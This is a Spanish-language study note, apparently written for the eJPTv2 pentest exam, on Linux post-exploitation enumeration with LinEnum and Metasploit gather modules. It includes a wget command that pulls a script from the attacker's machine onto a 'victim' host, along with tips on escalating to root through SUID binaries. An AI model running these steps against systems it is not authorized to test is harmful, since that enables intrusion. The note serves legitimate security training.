## 🧬 1. LinEnum – Script de Enumeración Local
**LinEnum** es uno de los scripts más clásicos y efectivos para sistemas Linux. Realiza un chequeo exhaustivo de casi todos los puntos críticos del sistema.

- **Proyecto:** [LinEnum-GitHub](https://github.com/rebootuser/LinEnum)
- **Función:** Revisa privilegios de `sudo`, archivos con bit **SUID**, tareas cron, archivos de configuración legibles y versiones de Kernel vulnerables.

### 🛠️ Uso de LinEnum:

1. **Transferencia:** Sube el archivo `LinEnum.sh` a la máquina víctima (preferiblemente a `/tmp`).
    - **Desde Meterpreter:** `upload /ruta/en/kali/LinEnum.sh /tmp/LinEnum.sh`
    - **Desde Python (HTTP):** * En Kali: `sudo python3 -m http.server 80`
        - En Víctima: `wget http://<TU_IP>/LinEnum.sh -O /tmp/LinEnum.sh`
2. **Preparación:** Es necesario otorgar permisos de ejecución al script:
	 - `chmod +x /tmp/LinEnum.sh`
3. **Ejecución:** Ejecútalo y, opcionalmente, redirige la salida a un archivo para analizarlo mejor:
	- `/tmp/LinEnum.sh > /tmp/LinEnum_Output.txt`

## 🛡️ 2. Enumeración con Módulos de [[Metasploit#🐧 Post-Explotación en Linux|Metasploit]] (Post-Exploitation)
Si dispones de una sesión de **Meterpreter** en el host Linux, puedes utilizar los módulos de la categoría `gather` para extraer información específica sin necesidad de subir scripts externos.

|**Módulo**|**Función**|
|---|---|
|**`post/linux/gather/enum_configs`**|Extrae archivos de configuración sensibles de servicios comunes (Apache, MySQL, etc.).|
|**`post/linux/gather/enum_network`**|Recolecta información detallada de interfaces, rutas y conexiones activas.|
|**`post/linux/gather/enum_system`**|Obtiene detalles del SO, Kernel, usuarios, grupos y variables de entorno.|
|**`post/linux/gather/checkvm`**|Determina si el objetivo es una máquina virtual o un contenedor (Docker/LXC).|
## 💡 Tips de Uso en el eJPTv2

- **¿Dónde ejecutarlo?:** Siempre usa el directorio `/tmp` en Linux. Es la carpeta donde casi todos los usuarios tienen permisos de escritura y ejecución por defecto.
- **Análisis Crítico ([[Explotar Binarios SUID|SUID]]):** En la salida de LinEnum, busca la sección de **SUID files**. Cualquier binario inusual con este permiso (como `nmap`, `vim` o `find`) puede darte acceso root directo.
- **CheckVM primero:** Al igual que en Windows, usa `checkvm` para saber si estás en un contenedor. Si estás en Docker, tu objetivo de escalada cambia a **"Container Escape"**.
- **Lectura rápida:** LinEnum marca en **color amarillo/rojo** los hallazgos más interesantes. No leas todo el log, busca los resaltados primero.


--- 
**Navegación:**
- Volver a: [[5.2 Post-Explotación Linux]]